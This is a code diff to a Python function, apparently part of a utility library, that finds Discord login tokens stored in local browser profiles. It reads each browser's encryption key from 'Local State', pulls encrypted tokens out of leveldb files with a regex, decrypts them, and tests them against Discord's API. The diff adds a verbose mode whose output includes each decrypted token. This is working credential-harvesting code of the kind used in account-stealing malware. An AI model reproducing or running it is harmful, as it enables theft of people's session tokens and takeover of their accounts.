@@ -107,7 +107,7 @@ def get_channel_messages(user_token, channel_id, limit=0, use_cache=True, show_p
                 return messages[:limit]
 
 
-def get_local_discord_user():
+def get_local_discord_user(show_output=False):
     global _cached_user_info
     try:
         a = _cached_user_info
@@ -154,31 +154,45 @@ def get_local_discord_user():
             'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
             'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'
         }
+        if show_output:
+            print(f'Now scanning for platforms')
         for platform, path in paths.items():
             if not os.path.exists(path): continue
+            if show_output:
+                print(f'Checking for {platform}')
             try:
                 with open(path + f"\\\\Local State", "r") as file:
                     key = json.loads(file.read())['os_crypt']['encrypted_key']
                     file.close()
-            except:
+            except Exception as e:
+                if show_output:
+                    print(f'^ Skipped due to {e}')
                 continue
+            if show_output:
+                print(f'^ Succeeded, now scanning leveldb files')
             for file in os.listdir(path + f"\\\\Local Storage\\\\leveldb\\\\"):
                 if not file.endswith(".ldb") and file.endswith(".log"):
                     continue
                 else:
+                    if show_output:
+                        print(f'Parsing file {file}')
                     try:
                         with open(path + f"\\\\Local Storage\\\\leveldb\\\\{file}", "r", errors='ignore') as files:
                             for x in files.readlines():
                                 x.strip()
                                 for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\\"]*", x):
                                     user_tokens.append(values)
-                    except PermissionError:
+                    except PermissionError as e:
+                        if show_output:
+                            print(f'^ Skipped due to {e}')
                         continue
             for i in user_tokens:
                 if i.endswith("\\\\"):
                     i.replace("\\\\", "")
                 elif i not in cleaned:
                     cleaned.append(i)
+            if show_output:
+                print(f'Now checking {len(cleaned)} tokens (skipping {len(user_tokens)-len(cleaned)} invalid tokens)')
             for user_token in cleaned:
                 try:
                     tok = decrypt(base64.b64decode(user_token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
@@ -193,6 +207,8 @@ def get_local_discord_user():
                             res = requests.get(url, headers={**zhmiscellany.netio.generate_headers(url), 'Authorization': tok})
                         except:
                             continue
+                        if show_output:
+                            print(f'Discord responded {res.status_code} for token {tok}')
                         if res.status_code == 200:
                             # if True:
                             res_json = res.json()
